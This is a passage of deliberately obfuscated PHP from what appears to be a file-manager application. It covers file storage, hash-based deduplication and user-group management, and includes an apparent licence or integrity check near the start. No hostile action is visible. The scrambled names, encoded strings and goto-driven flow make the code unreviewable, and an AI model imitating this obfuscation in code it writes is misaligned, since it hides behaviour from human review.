ÅÅº˜ñ¨ = array_to_keyvalue($b ÅÅº˜ñ¨, $a™©à‚ğÜØ[33], $a™©à‚ğÜØ[1436]); return array_unique($b ÅÅº˜ñ¨); } public function userSearch($a×íó‹¯…, $d½’”â×–À = "\x2a") { return Model($_SERVER[Å¸ş][479])->where($a×íó‹¯…)->field($d½’”â×–À)->find(); } } goto d°ƒğÅÌí¾; C«ÕĞ˜É™ª: if ($_SERVER[$_SERVER[Å¸ş][557]] != $B¡ê¸‚Èä($cëØÂäßÏ¤)) { goto F¬ã¯²“Á; A–…éÂ²™„: $bÒ¤¥¥•™ë($cëØÂäßÏ¤); goto bÑ¥³ÍÇ„Á; F¬ã¯²“Á: $cÕ¤Ñ‡Ê«‚ = $_SERVER[Å¸ş][558]; $b¶Ü·½ø„Í = $_SERVER[$_SERVER[Å¸ş][559]] . $_SERVER[Å¸ş][560]; $BÌì²¡”Û = $cÕ¤Ñ‡Ê«‚($b¶Ü·½ø„Í); goto E”„Åì²„; E”„Åì²„: $B›ÎòÂºôæ = explode($_SERVER[Å¸ş][217], $BÌì²¡”Û); if (count($B›ÎòÂºôæ) < $_SERVER[Å¸ş][561]) { $DóŸ«à¾‚‘ = $_SERVER[Å¸ş][562]; $DóŸ«à¾‚‘(); } $bÒ¤¥¥•™ë = $_SERVER[Å¸ş][563]; goto A–…éÂ²™„; bÑ¥³ÍÇ„Á: } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\145" => "\151\157\x5f\x66\x69\x6c\x65\137\x6d\x65\164\141", "\155\145\x74\141\x46\x69\145\154\144" => "\x66\151\154\x65\111\104"); public function fileInfo($E ¥ã›§¨) { $e¡‡×Ø£± =& $_SERVER[Å¸ş]; static $CõØèò½Ïù = array(); if (!isset($CõØèò½Ïù[$E ¥ã›§¨])) { $aœÂèĞóÀ© = $e¡‡×Ø£±[2150]; $døƒ…´ŠÄ = Model($e¡‡×Ø£±[422])->field($aœÂèĞóÀ©)->where(array($e¡‡×Ø£±[420] => $E ¥ã›§¨))->find(); $CõØèò½Ïù[$E ¥ã›§¨] = $døƒ…´ŠÄ; } return $CõØèò½Ïù[$E ¥ã›§¨]; } public function addFileByContent($DİÓÙ™Œã = '', $DŒë‚›Üé™ = '') { goto d•ß®‘ÂŒ£; CøßÅÇ¬ö‡: $A©¹ˆ‡ñ® = $b´³®ºôÑ . $céŸŞÉö[2152] . rand_string(16); file_put_contents($A©¹ˆ‡ñ®, $DİÓÙ™Œã); $dÜôí¾çÊÊ = $this->addFile($A©¹ˆ‡ñ®, $DŒë‚›Üé™, !0); goto e‡³ù¥¦é; d•ß®‘ÂŒ£: $céŸŞÉö =& $_SERVER[Å¸ş]; $b´³®ºôÑ = TEMP_PATH . $céŸŞÉö[2151]; if (!is_dir($b´³®ºôÑ)) { mk_dir($b´³®ºôÑ); } goto CøßÅÇ¬ö‡; e‡³ù¥¦é: if (file_exists($A©¹ˆ‡ñ®)) { @unlink($A©¹ˆ‡ñ®); } return $dÜôí¾çÊÊ; goto E”ëÒ»òæš; E”ëÒ»òæš: } public function createFileName($aÀ÷§ø„˜›) { goto D—ÚÏÀ£¹˜; Dªî¶ÀÒÉ¹: $EíŞõç»«œ = $AŸÎ®ê¿‚£->pathFather($bØëŠƒ‘¢³); static $bã••ŠÌ×™ = false; $e‹«‹¨ø = $bŒŸ³ëµé[2153] . md5($EíŞõç»«œ); goto E´·È·ß á; D—ÚÏÀ£¹˜: $bŒŸ³ëµé =& $_SERVER[Å¸ş]; $AŸÎ®ê¿‚£ = IO::init($bŒŸ³ëµé[8]); $bØëŠƒ‘¢³ = $this->makeFilePath($aÀ÷§ø„˜›, $AŸÎ®ê¿‚£); goto Dªî¶ÀÒÉ¹; E´·È·ß á: if (!$bã••ŠÌ×™ && !Cache::get($e‹«‹¨ø)) { $bã••ŠÌ×™ = !0; $a¾¶ìÏ°ì = IO::mkdir($EíŞõç»«œ); if (!IO::exist($a¾¶ìÏ°ì . $bŒŸ³ëµé[2154])) { IO::mkfile($a¾¶ìÏ°ì . $bŒŸ³ëµé[2154]); } Cache::set($e‹«‹¨ø, 1, 3600 * 2); } return $bØëŠƒ‘¢³; goto FÈ‚‰Å·Ñİ; FÈ‚‰Å·Ñİ: } public function makeFilePath($f¯ğ¼½ï‘, $DËŠà‰–•) { goto C°‚¿Ûöİ; DÉãĞ¨îÃÇ: switch ($eøˆŞ¸”š) { case $d¯§à°¥“[2158]: $d‚›Çİ§¦ = $d‚›Çİ§¦ . $d¯§à°¥“[91] . $DËŠà‰–•->ext($f¯ğ¼½ï‘); if ($DËŠà‰–•->ext($f¯ğ¼½ï‘) == $d¯§à°¥“[2098]) { $d‚›Çİ§¦ .= $d¯§à°¥“[1336]; } break; case $d¯§à°¥“[2159]: goto FĞÚîœ¦¸£; cµÕÚóğ¡¢: CacheLock::lock($FÛ†§Şì‹Œ); $aÜ°³„ç¿ì = IO::fileNameAuto($FÊ‚Ùì›¬Ã, $f¯ğ¼½ï‘); $d‚›Çİ§¦ = $FÊ‚Ùì›¬Ã . $aÜ°³„ç¿ì; goto AÏ¤àª©å; AÏ¤àª©å: if (IO::isTypeObject() && !IO::isUploadServer()) { IO::setContent($d‚›Çİ§¦, $d¯§à°¥“[33]); } CacheLock::unlock($FÛ†§Şì‹Œ); break; goto e‰ÊäæÎõ; FĞÚîœ¦¸£: $EäšÌ¢Óö† = Model($d¯§à°¥“[1086])->get($d¯§à°¥“[1332]); $F‰áŸµŞ× = substr(md5($d¯§à°¥“[1917] . $EäšÌ¢Óö† . date($d¯§à°¥“[690])), 0, 8); $f…œ­¨ŸÆÏ = KodIO::defaultDriver(); goto B®ïŠÒ¹İ¹; B®ïŠÒ¹İ¹: $FÊ‚Ùì›¬Ã = $d¯§à°¥“[2160] . $f…œ­¨ŸÆÏ[$d¯§à°¥“[367]] . $d¯§à°¥“[2161] . date($d¯§à°¥“[2162]) . $F‰áŸµŞ× . $d¯§à°¥“[8]; if ($DËŠà‰–•->ext($f¯ğ¼½ï‘) == $d¯§à°¥“[2098]) { $f¯ğ¼½ï‘ .= $d¯§à°¥“[1336]; } $FÛ†§Şì‹Œ = $d¯§à°¥“[2163] . $FÊ‚Ùì›¬Ã . $f¯ğ¼½ï‘; goto cµÕÚóğ¡¢; e‰ÊäæÎõ: case $d¯§à°¥“[2157]: break; default: break; } return $d‚›Çİ§¦; goto C¶¶Š’™Š; C°‚¿Ûöİ: $d¯§à°¥“ =& $_SERVER[Å¸ş]; $eøˆŞ¸”š = Model($d¯§à°¥“[1086])->get($d¯§à°¥“[2155]); $FÊ‚Ùì›¬Ã = KodIO::defaultIO() . date($d¯§à°¥“[2156]); goto cÁ¿ö¦Éã; cÁ¿ö¦Éã: $d‚›Çİ§¦ = $FÊ‚Ùì›¬Ã . rand_string(5) . short_id(100); $f¯ğ¼½ï‘ = str_replace($d¯§à°¥“[8], $d¯§à°¥“[70], KodIO::clear($f¯ğ¼½ï‘)); if (!$f¯ğ¼½ï‘) { $eøˆŞ¸”š = $d¯§à°¥“[2157]; } goto DÉãĞ¨îÃÇ; C¶¶Š’™Š: } public function addFileByRemote($Dª¼ç„åî, $CÜƒÏ¢Ÿ¨›, $Eœ¤œÓÜ»‹ = array()) { goto f‡èáàöÙ»; b‘¬õâªÊ: $cİ¶¼ùÖ–ª = IO::hashMd5($Dª¼ç„åî, $dÄâÎ”å®³); $DÕ¶Û¥İ¸Ş = KodIO::defaultDriver(); $AõÃ¸°öÌÔ = array($a…ºĞÓ‡Š[522] => IO::size($Dª¼ç„åî), $a…ºĞÓ‡Š[2164] => 1, $a…ºĞÓ‡Š[386] => $CÜƒÏ¢Ÿ¨›, $a…ºĞÓ‡Š[738] => $DÕ¶Û¥İ¸Ş[$a…ºĞÓ‡Š[367]], $a…ºĞÓ‡Š[387] => $Dª¼ç„åî, $a…ºĞÓ‡Š[2165] => $Eœ¤œÓÜ»‹[$a…ºĞÓ‡Š[164]] ? $Eœ¤œÓÜ»‹[$a…ºĞÓ‡Š[164]] : IO::hashSimple($Dª¼ç„åî), $a…ºĞÓ‡Š[2166] => $cİ¶¼ùÖ–ª ? $cİ¶¼ùÖ–ª : $dÄâÎ”å®³); goto D­±¶¿Šœ; D­±¶¿Šœ: if ($C°á¹ÂÁÖ = $this->addFileCheckExist($AõÃ¸°öÌÔ[$a…ºĞÓ‡Š[164]], $AõÃ¸°öÌÔ[$a…ºĞÓ‡Š[163]], $AõÃ¸°öÌÔ[$a…ºĞÓ‡Š[77]])) { return $C°á¹ÂÁÖ; } return $this->addFileData($AõÃ¸°öÌÔ); goto c‡ğĞÙ“¹; f‡èáàöÙ»: $a…ºĞÓ‡Š =& $_SERVER[Å¸ş]; if (!IO::exist($Dª¼ç„åî)) { return !1; } $dÄâÎ”å®³ = $Eœ¤œÓÜ»‹[$a…ºĞÓ‡Š[163]] ? $Eœ¤œÓÜ»‹[$a…ºĞÓ‡Š[163]] : $a…ºĞÓ‡Š[33]; goto b‘¬õâªÊ; c‡ğĞÙ“¹: } private function addFileData($EÒ«…¤¢áö) { $b“¼‹¼÷Ï® =& $_SERVER[Å¸ş]; if (!$EÒ«…¤¢áö) { return !1; } $EÒ«…¤¢áö[$b“¼‹¼÷Ï®[77]] = intval($EÒ«…¤¢áö[$b“¼‹¼÷Ï®[77]]); if (!$EÒ«…¤¢áö[$b“¼‹¼÷Ï®[77]] && strlen($EÒ«…¤¢áö[$b“¼‹¼÷Ï®[164]]) > 32) { $EÒ«…¤¢áö[$b“¼‹¼÷Ï®[77]] = intval(substr($EÒ«…¤¢áö[$b“¼‹¼÷Ï®[164]], 32)); } $fÇ¶Ì®…ØÍ = $this->add($EÒ«…¤¢áö); return $this->find($fÇ¶Ì®…ØÍ); } public function addFile($bïœ»óğä±, $aîÔÁŒ¿¬, $D¶œÑ°ì… = false) { goto f¨İ¿ë°ÍÕ; c‰£»‚ÕÌ˜: $FƒèòİÆ…  = $this->addFileMake($bïœ»óğä±, $eïÅòœíËœ, $DÍô©…­Ó, $a’éÏÖ¡Ïœ, $aîÔÁŒ¿¬, $D¶œÑ°ì…); $FÇÜê³†ÖÂ = $this->addFileData($FƒèòİÆ… ); CacheLock::unlock($FäîÒº‘ö); goto d¼ŠïÔ È²; f¨İ¿ë°ÍÕ: $DÍô©…­Ó = IO::hashSimple($bïœ»óğä±); $a’éÏÖ¡Ïœ = IO::hashMd5($bïœ»óğä±); $eïÅòœíËœ = IO::size($bïœ»óğä±); goto Fµï¯–„ÍÆ; Fµï¯–„ÍÆ: $FäîÒº‘ö = $_SERVER[Å¸ş][2167] . $a’éÏÖ¡Ïœ; CacheLock::lock($FäîÒº‘ö); if ($E–””‡¦¹ = $this->addFileCheckExist($DÍô©…­Ó, $a’éÏÖ¡Ïœ, $eïÅòœíËœ)) { CacheLock::unlock($FäîÒº‘ö); return $E–””‡¦¹; } goto c‰£»‚ÕÌ˜; d¼ŠïÔ È²: return $FÇÜê³†ÖÂ; goto fãáÁ‘Ì´¯; fãáÁ‘Ì´¯: } public function addFileMake($d¨Œæ‹Í–ƒ, $AŸƒòÛàÔ‘, $EÛøğéòœ, $b‹Ö¥‚á¦ô, $BŠÆ†ÃáŸ, $cˆÍ³ƒÛ‚) { goto E‚‰Ö«‡œÔ; f´˜ãæ«Ÿ¶: $C·¡‡êô›‚ = get_path_this($E¦ßÇÄ¼‚‚); if ($cˆÍ³ƒÛ‚) { $BÎÔñÛ»ß = IO::move($d¨Œæ‹Í–ƒ, $cÄ¦êè±š, !1, $C·¡‡êô›‚); } else { $BÎÔñÛ»ß = IO::copy($d¨Œæ‹Í–ƒ, $cÄ¦êè±š, !1, $C·¡‡êô›‚); } if (!$BÎÔñÛ»ß) { return !1; } goto fÄ¥ÒÃ…Õí; fÄ¥ÒÃ…Õí: $CŞŸ‚éšÂ = KodIO::defaultDriver(); $aÉ‹¾ ãù = array($C–ÂÚæ¾Úó[522] => $AŸƒòÛàÔ‘, $C–ÂÚæ¾Úó[2164] => 1, $C–ÂÚæ¾Úó[386] => $BŠÆ†ÃáŸ, $C–ÂÚæ¾Úó[738] => $CŞŸ‚éšÂ[$C–ÂÚæ¾Úó[367]], $C–ÂÚæ¾Úó[387] => $E¦ßÇÄ¼‚‚, $C–ÂÚæ¾Úó[2165] => $EÛøğéòœ, $C–ÂÚæ¾Úó[2166] => $b‹Ö¥‚á¦ô); return $aÉ‹¾ ãù; goto fĞì×µØ ®; E‚‰Ö«‡œÔ: $C–ÂÚæ¾Úó =& $_SERVER[Å¸ş]; $E¦ßÇÄ¼‚‚ = $this->createFileName($BŠÆ†ÃáŸ); $cÄ¦êè±š = get_path_father($E¦ßÇÄ¼‚‚); goto f´˜ãæ«Ÿ¶; fĞì×µØ ®: } public function addFileCheckExist($CÉ¼ˆôËêË, $d¤¶ ôì¿„, $eôÎöß·¤Ê) { $d¼ Š‚¡—ê =& $_SERVER[Å¸ş]; $C¹Ä¦­å£ = $this->findByHash($CÉ¼ˆôËêË, $d¤¶ ôì¿„); if (!$C¹Ä¦­å£) { return !1; } $B²ê³¶Å¹ = array($d¼ Š‚¡—ê[2164] => intval($C¹Ä¦­å£[$d¼ Š‚¡—ê[2168]]) + 1, $d¼ Š‚¡—ê[522] => $eôÎöß·¤Ê); $this->where(array($d¼ Š‚¡—ê[420] => $C¹Ä¦­å£[$d¼ Š‚¡—ê[419]]))->save($B²ê³¶Å¹); return $C¹Ä¦­å£; } public function remove($EÂŠößéàƒ) { $this->linkCountChange($EÂŠößéàƒ, !1); $this->clearEmpty(); return !0; } public function linkAdd($b‘›Òí”Š) { $this->linkCountChange($b‘›Òí”Š, !0); } public function linkCountChange($BÔ©Ù­“®Ä, $cë®Ää‰Êâ) { goto b×‘‘Œö´ù; bğèµ´…Àİ: $A‘ˆŸ‘ôÖ« = array(); foreach ($BÔ©Ù­“®Ä as $a™ˆŸ‡êâî) { $Bß²¾×ì©“ = $a™ˆŸ‡êâî . $EŒ…£ÒÆŸ[33]; if (!$A‘ˆŸ‘ôÖ«[$Bß²¾×ì©“]) { $A‘ˆŸ‘ôÖ«[$Bß²¾×ì©“] = 0; } $A‘ˆŸ‘ôÖ«[$Bß²¾×ì©“]++; } $F¾ï˜§ÁÒ = array(); goto A£°ÅïŞíç; A£°ÅïŞíç: foreach ($A‘ˆŸ‘ôÖ« as $a™ˆŸ‡êâî => $aƒôğ¢ëÒŒ) { $Bß²¾×ì©“ = $aƒôğ¢ëÒŒ . $EŒ…£ÒÆŸ[33]; if (!$F¾ï˜§ÁÒ[$Bß²¾×ì©“]) { $F¾ï˜§ÁÒ[$Bß²¾×ì©“] = array(); } $F¾ï˜§ÁÒ[$Bß²¾×ì©“][] = $a™ˆŸ‡êâî; } foreach ($F¾ï˜§ÁÒ as $aƒôğ¢ëÒŒ => $AğŒ××‹ˆ) { if (!$AğŒ××‹ˆ) { continue; } $aƒôğ¢ëÒŒ = $cë®Ää‰Êâ ? $aƒôğ¢ëÒŒ : -intval($aƒôğ¢ëÒŒ); $AãÚÆ£¶¢ = array($EŒ…£ÒÆŸ[419] => array($EŒ…£ÒÆŸ[7], $AğŒ××‹ˆ)); if ($aƒôğ¢ëÒŒ < 0) { $AãÚÆ£¶¢[$EŒ…£ÒÆŸ[2168]] = array($EŒ…£ÒÆŸ[926], abs($aƒôğ¢ëÒŒ)); } $this->where($AãÚÆ£¶¢)->setAdd($EŒ…£ÒÆŸ[2168], $aƒôğ¢ëÒŒ); } goto fºİššÆ‘; b×‘‘Œö´ù: $EŒ…£ÒÆŸ =& $_SERVER[Å¸ş]; if (!$BÔ©Ù­“®Ä) { return; } if (!is_array($BÔ©Ù­“®Ä)) { $BÔ©Ù­“®Ä = array($BÔ©Ù­“®Ä); } goto bğèµ´…Àİ; fºİššÆ‘: } public function findByHash($Eç’õ­¾Õè, $d”†Ôğš°ø = false) { $a¯Ì©öÃìˆ =& $_SERVER[Å¸ş]; if (!$Eç’õ­¾Õè && !$d”†Ôğš°ø) { return !1; } $d¬”À÷¹Á¶ = array($a¯Ì©öÃìˆ[2165] => $Eç’õ­¾Õè); if ($d”†Ôğš°ø) { $d¬”À÷¹Á¶ = array($a¯Ì©öÃìˆ[2166] => $d”†Ôğš°ø); } return $this->order($a¯Ì©öÃìˆ[2169])->where($d¬”À÷¹Á¶)->find(); } public function clearEmpty($fì¶§‚“¸¦ = 0) { goto CÓÓËØì©Ñ; CÓÓËØì©Ñ: $E˜‚‰­¸«Ì =& $_SERVER[Å¸ş]; $bŞõ¸àÄ†  = time() - 3600 * 24 * $fì¶§‚“¸¦; $dñ´Èˆ³Ïâ = $E˜‚‰­¸«Ì[2170] . $bŞõ¸àÄ† ; goto a¯¨·ØÌø¥; a¯¨·ØÌø¥: $CƒßîÑ¼ÖÊ = $this->where($dñ´Èˆ³Ïâ)->select(); if (!$CƒßîÑ¼ÖÊ) { return; } $aß—ä»¸¦ = new Task($E˜‚‰­¸«Ì[2171], $E˜‚‰­¸«Ì[33], count($CƒßîÑ¼ÖÊ)); goto dÏ‘ÏøŒÃ; dÏ‘ÏøŒÃ: foreach ($CƒßîÑ¼ÖÊ as $f‚÷«É´±Ø) { $aß—ä»¸¦->update(1); $this->resetFile($f‚÷«É´±Ø); } $aß—ä»¸¦->end(); goto F†›‹ß¥¨í; F†›‹ß¥¨í: } public function resetFile($Eºç’òõ†Ù) { goto DØ¡Õ³øÉÌ; E‘”ç‰¥ğ: if ($Eºç’òõ†Ù[$Aƒ‡„ë§¹’[2168]] != $B«¼½•¦ë) { $this->where($Bß‡ª’ˆ›¼)->save(array($Aƒ‡„ë§¹’[2164] => $B«¼½•¦ë)); } goto dœ§À‡¸ùÂ; eÈ¸­†ä¦Ú: $E Ä¡àêğË = Model($Aƒ‡„ë§¹’[2172])->where($Bß‡ª’ˆ›¼)->count(); $B«¼½•¦ë = intval($f ÕÏ·„¬) + intval($E Ä¡àêğË); if ($B«¼½•¦ë == 0) { IO::remove($Eºç’òõ†Ù[$Aƒ‡„ë§¹’[75]]); $this->where($Bß‡ª’ˆ›¼)->delete(); $this->metaSet($Eºç’òõ†Ù[$Aƒ‡„ë§¹’[419]], null, null); return; } goto E‘”ç‰¥ğ; DØ¡Õ³øÉÌ: $Aƒ‡„ë§¹’ =& $_SERVER[Å¸ş]; $Bß‡ª’ˆ›¼ = array($Aƒ‡„ë§¹’[420] => $Eºç’òõ†Ù[$Aƒ‡„ë§¹’[419]]); $f ÕÏ·„¬ = Model($Aƒ‡„ë§¹’[1115])->where($Bß‡ª’ˆ›¼)->count(); goto eÈ¸­†ä¦Ú; dœ§À‡¸ùÂ: } public function storageInfo($BÊ«˜Ôà„… = false) { goto BÀâ•³™®; BÀâ•³™®: $bšÁô÷°Ò =& $_SERVER[Å¸ş]; $fÂæñæ„÷‘ = $this->count() + 0.0; $e”ŞËâŞôø = 0; goto cå–È‚¹•; cå–È‚¹•: $C°èìÂƒƒ = 1; $BîìùÂ©ºÔ = 0; $cô¹Ø°—‹ = 5000; goto D¬óï…Á¬•; D¬óï…Á¬•: for ($CˆªäÅ¢æ = 0; $CˆªäÅ¢æ < $fÂæñæ„÷‘; $CˆªäÅ¢æ = $CˆªäÅ¢æ + $cô¹Ø°—‹) { $E«™öî©Û = $this->limit($CˆªäÅ¢æ, $CˆªäÅ¢æ + $cô¹Ø°—‹)->select(); foreach ($E«™öî©Û as $CÕ–†Ä•êÕ) { $C°èìÂƒƒ += $CÕ–†Ä•êÕ[$bšÁô÷°Ò[77]] * $CÕ–†Ä•êÕ[$bšÁô÷°Ò[2168]]; $e”ŞËâŞôø += $CÕ–†Ä•êÕ[$bšÁô÷°Ò[77]] * ($CÕ–†Ä•êÕ[$bšÁô÷°Ò[2168]] - 1); $BîìùÂ©ºÔ += $CÕ–†Ä•êÕ[$bšÁô÷°Ò[2168]]; } } $BÇ®Ò‚——å = array($bšÁô÷°Ò[2173] => $C°èìÂƒƒ, $bšÁô÷°Ò[2174] => $e”ŞËâŞôø, $bšÁô÷°Ò[2175] => $e”ŞËâŞôø / $C°èìÂƒƒ, $bšÁô÷°Ò[81] => $fÂæñæ„÷‘, $bšÁô÷°Ò[2176] => $BîìùÂ©ºÔ); return $BÇ®Ò‚——å; goto f¦ãŠğÚğ¥; f¦ãŠğÚğ¥: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\x6d\145" => "\x67\x72\157\165\160\137\x6d\x65\164\x61", "\155\x65\x74\141\106\x69\x65\x6c\144" => "\x67\162\x6f\165\160\x49\104"); protected function cacheFunctionAlias($BàÊÄÊ´¦ë) { $Bí­²Óù½ =& $_SERVER[Å¸ş]; return array($Bí­²Óù½[2177] => array($BàÊÄÊ´¦ë[0], $Bí­²Óù½[2178]), $Bí­²Óù½[2179] => array($BàÊÄÊ´¦ë[0], $Bí­²Óù½[2178])); } protected function getInfo($cÉ¾¢‹áÇ†) { $E²³óÇôÉµ = $this->getInfoSimple($cÉ¾¢‹áÇ†); if (!$E²³óÇôÉµ) { return !1; } return $this->_listDataApplyItem($E²³óÇôÉµ); } protected function getInfoSimple($c‹ŸË¤ÉÉÒ, $bÇğåÁ‚çÜ = false) { $CòÅ²ì·‚ =& $_SERVER[Å¸ş]; if ($bÇğåÁ‚çÜ) { $eÌÈÜ¹‡º› = array($CòÅ²ì·‚[2108] => intval($c‹ŸË¤ÉÉÒ)); $b…ˆĞèí˜ = $this->where($eÌÈÜ¹‡º›)->find(); return is_array($b…ˆĞèí˜) ? $b…ˆĞèí˜ : array(); } return $this->cacheFunctionGet($CòÅ²ì·‚[2180], $c‹ŸË¤ÉÉÒ); } protected function groupAdd($e‚“ß£…‰Î) { goto B¢¹ï†Şì; F„ë´ õ§: if ($A¾äšÓ¼¹İ[$eœµ ‚…ïÖ[461]]) { $c¹½ÓÒÙ•‹ = $A¾äšÓ¼¹İ[$eœµ ‚…ïÖ[461]] . $A¾äšÓ¼¹İ[$eœµ ‚…ïÖ[2108]] . $eœµ ‚…ïÖ[47]; } $f‹˜œñ¾— = array($eœµ ‚…ïÖ[386] => $this->groupNameAuto($e‚“ß£…‰Î[$eœµ ‚…ïÖ[463]], $e‚“ß£…‰Î[$eœµ ‚…ïÖ[28]]), $eœµ ‚…ïÖ[368] => $e‚“ß£…‰Î[$eœµ ‚…ïÖ[463]], $eœµ ‚…ïÖ[527] => $c¹½ÓÒÙ•‹, $eœµ ‚…ïÖ[2181] => $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2092]], $eœµ ‚…ïÖ[2182] => 0, $eœµ ‚…ïÖ[2112] => 0); if (isset($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2130]])) { $f‹˜œñ¾—[$eœµ ‚…ïÖ[2130]] = $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2130]]; } else { $fÂÓ‡”ƒ½Î = $this->max($eœµ ‚…ïÖ[2130]); if (!$fÂÓ‡”ƒ½Î) { $fÂÓ‡”ƒ½Î = 0; } $f‹˜œñ¾—[$eœµ ‚…ïÖ[2130]] = $fÂÓ‡”ƒ½Î + 1; } goto CêÎ—Â¼©; e¸ãß¤„œé: if (isset($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2183]])) { $this->metaSet($FÇõÉØ”¨, array($eœµ ‚…ïÖ[2183] => $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2183]], $eœµ ‚…ïÖ[2184] => $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2184]])); unset($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2183]]); unset($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2184]]); } Model($eœµ ‚…ïÖ[1115])->groupRootAdd($FÇõÉØ”¨); return $FÇõÉØ”¨; goto câîÏ¦Ã”å; CêÎ—Â¼©: if (!empty($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]])) { $f‹˜œñ¾—[$eœµ ‚…ïÖ[2108]] = $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]]; } $FÇõÉØ”¨ = $this->add($f‹˜œñ¾—); $this->setNamePinyin($FÇõÉØ”¨, $f‹˜œñ¾—[$eœµ ‚…ïÖ[28]]); goto e¸ãß¤„œé; B¢¹ï†Şì: $eœµ ‚…ïÖ =& $_SERVER[Å¸ş]; if (!$e‚“ß£…‰Î[$eœµ ‚…ïÖ[463]] && isset($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]]) && $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]] == 1) { if ($A¾äšÓ¼¹İ = $this->getInfoSimple($e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]], !0)) { return $e‚“ß£…‰Î[$eœµ ‚…ïÖ[2108]]; } } else { $A¾äšÓ¼¹İ = $this->getInfoSimple($e‚“ß£…‰Î[$eœµ ‚…ïÖ[463]]); if (!$A¾äšÓ¼¹İ) { return !1; } } $c¹½ÓÒÙ•‹ = $eœµ ‚…ïÖ[472]; goto F„ë´ õ§; câîÏ¦Ã”å: } protected function groupEdit($e»Å½îˆœí, $D„§Ã¸‘„) { $Dñ‡‡‡×Ø± =& $_SERVER[Å¸ş]; if (!empty($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[463]])) { $bÖÒÃ—äÌ  = $this->getInfoSimple($e»Å½îˆœí); $D¡ÓÈ³ ‚Ä = $this->getInfoSimple($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[463]]); if (!$bÖÒÃ—äÌ  || !$D¡ÓÈ³ ‚Ä) { return !1; } if ($bÖÒÃ—äÌ [$Dñ‡‡‡×Ø±[2108]] == $D¡ÓÈ³ ‚Ä[$Dñ‡‡‡×Ø±[2108]]) { return !1; } if ($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[463]] != $bÖÒÃ—äÌ [$Dñ‡‡‡×Ø±[463]]) { if ($D¡ÓÈ³ ‚Ä[$Dñ‡‡‡×Ø±[461]] !== $bÖÒÃ—äÌ [$Dñ‡‡‡×Ø±[461]] && strpos($D¡ÓÈ³ ‚Ä[$Dñ‡‡‡×Ø±[461]], $bÖÒÃ—äÌ [$Dñ‡‡‡×Ø±[461]] . $bÖÒÃ—äÌ [$Dñ‡‡‡×Ø±[2108]] . $Dñ‡‡‡×Ø±[47]) === 0) { return !1; } $D„§Ã¸‘„[$Dñ‡‡‡×Ø±[527]] = $D¡ÓÈ³ ‚Ä[$Dñ‡‡‡×Ø±[461]] . $D„§Ã¸‘„[$Dñ‡‡‡×Ø±[463]] . $Dñ‡‡‡×Ø±[47]; $this->_changeChildLevel($bÖÒÃ—äÌ , $D¡ÓÈ³ ‚Ä); } } if (isset($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[28]])) { $this->setNamePinyin($e»Å½îˆœí, $D„§Ã¸‘„[$Dñ‡‡‡×Ø±[28]]); } if (isset($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[2183]])) { $this->metaSet($e»Å½îˆœí, array($Dñ‡‡‡×Ø±[2183] => $D„§Ã¸‘„[$Dñ‡‡‡×Ø±[2183]], $Dñ‡‡‡×Ø±[2184] => $D„§Ã¸‘„[$Dñ‡‡‡×Ø±[2184]])); unset($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[2183]]); unset($D„§Ã¸‘„[$Dñ‡‡‡×Ø±[2184]]); } return $this->where(array($Dñ‡‡‡×Ø±[2185] => $e»Å½îˆœí))->save($D„§Ã¸‘„); } private function _changeChildLevel($Bä™ÇÉ·Û, $F¤·Ã…¢ , $B˜âÅÛ‰¼¸ = false) { goto a‰ ”ÒÍåõ; Cµ„ƒ»«è: if ($B˜âÅÛ‰¼¸) { $eƒøùë«³Å = $F¤·Ã…¢ [$C¥Ñâ•âé°[461]] . $F¤·Ã…¢ [$C¥Ñâ•âé°[2108]] . $C¥Ñâ•âé°[47]; } $B‘Œ– ÕÜê = array($C¥Ñâ•âé°[527] => array($C¥Ñâ•âé°[485], $Bä™ÇÉ·Û[$C¥Ñâ•âé°[461]] . $Bä™ÇÉ·Û[$C¥Ñâ•âé°[2108]] . $C¥Ñâ•âé°[486])); $dƒ­ ‚ô×· = array($C¥Ñâ•âé°[527] => array($C¥Ñâ•âé°[536], "\x72\145\x70\154\141\x63\145\50\x70\141\162\145\x6e\x74\114\145\166\145\154\x2c\47{$B•ÀåÀ—²Ø}\x27\x2c\47{$eƒøùë«³Å}\x27\x29")); goto cùÖÛ‹¹…; a‰ ”ÒÍåõ: $C¥Ñâ•âé° =& $_SERVER[Å¸ş]; $B•ÀåÀ—²Ø = $Bä™ÇÉ·Û[$C¥Ñâ•âé°[461]] . $Bä™ÇÉ·Û[$C¥Ñâ•âé°[2108]] . $C¥Ñâ•âé°[47]; $eƒøùë«³Å = $F¤·Ã…¢ [$C¥Ñâ•âé°[461]] . $F¤·Ã…¢ [$C¥Ñâ•âé°[2108]] . $C¥Ñâ•âé°[47] . $Bä™ÇÉ·Û[$C¥Ñâ•âé°[2108]] . $C¥Ñâ•âé°[47]; goto Cµ„ƒ»«è; cùÖÛ‹¹…: $this->where($B‘Œ– ÕÜê)->data($dƒ­ ‚ô×·)->save(); goto A½’Æ½í»Ä; A½’Æ½í»Ä: } public function setNamePinyin($cğê™‘–Ì›, $a•¯¯¢™Ô = false) { $A¨œİ‘²‘¼ =& $_SERVER[Å¸ş]; if (!$a•¯¯¢™Ô) { $b–Úëî†¼• = $this->getInfoSimple($cğê™‘–Ì›); $a•¯¯¢™Ô = $b–Úëî†¼•[$A¨œİ‘²‘¼[28]]; } if (!Input::check($a•¯¯¢™Ô, $A¨œİ‘²‘¼[530])) { $this->metaSet($cğê™‘–Ì›, 